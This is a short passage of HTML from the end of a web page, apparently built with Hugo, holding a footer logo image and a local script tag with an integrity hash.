<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>